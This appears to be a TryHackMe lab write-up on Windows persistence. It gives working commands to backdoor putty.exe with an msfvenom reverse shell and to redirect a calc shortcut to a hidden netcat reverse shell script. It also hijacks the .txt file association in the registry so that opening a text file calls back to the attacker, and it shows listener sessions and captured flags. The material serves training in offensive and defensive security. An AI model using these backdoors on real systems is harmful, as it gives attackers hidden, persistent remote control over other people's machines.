### Putty Backdoor Example
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```
### Shortcut Files
We have a shortcut for calc on the desktop, so we are going to abuse this. We are going to create a reverse shell using a similarly named ps1 as the target for the calc. We can do this with the following from our PWSH session

```powershell
new-item calc.ps1


    Directory: C:\Windows\System32


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/27/2024  10:38 AM              0 calc.ps1


PS C:\Windows\System32> set-content -Path .\calc.ps1 -Value 'Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.93.71 4445"'
PS C:\Windows\System32> get-content .\calc.ps1
```

We now modify the shortcut to run our backdoor
``` python
"Target":"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden C:\Windows\System32\calc.ps1"

Change Icon
Look for icons in this file
"calc.exe": "Select the Calc Icon to ensure it remains sneaky"
```

We setup a listener on our attack box
```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/win_local_pers/spec_privs]
└─$ nc -lvnp 4445           
listening on [any] 4445 ...
```

From our RDP session we double click on the calc shortcut that we modified and should see the connection in our shell
```bash
connect to [10.11.93.71] from (UNKNOWN) [10.10.226.174] 49989
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\flags\flag5.exe
C:\flags\flag5.exe
THM{NO_SHORTCUTS_IN_LIFE}

```

### Hijacking File Associations
We are going to make any .txt files open our backdoor
`Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.txt`

This location will show us our Programmatic ID. With this info we can look for the shell\open\command for the `txtfile` *ProgID*
`Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command`

We will then replace the Default value with our backdoor.
*Create a new ps1*
```powershell
new-item -path 'C:\Windows\System32\bd2.ps1'

set-content -path C:\Windows\System32\bd2.ps1 'Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.93.71 4445"' 

add-content -path C:\Windows\System32\bd2.ps1 "C:\Windows\system32\NOTEPAD.EXE $args[0]"
```

Default:
```
%SystemRoot%\system32\NOTEPAD.EXE %1
```

New:
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden C:\Windows\System32\bd2.ps1 %1
```

Now we open a .txt file to initiate the connection.
```
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/win_local_pers/spec_privs]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.226.174] 49999
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>c:flags\flag6.exe
c:flags\flag6.exe
The system cannot find the path specified.

C:\Users\Administrator\Desktop>c:\flags\flag6.exe
c:\flags\flag6.exe
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}

```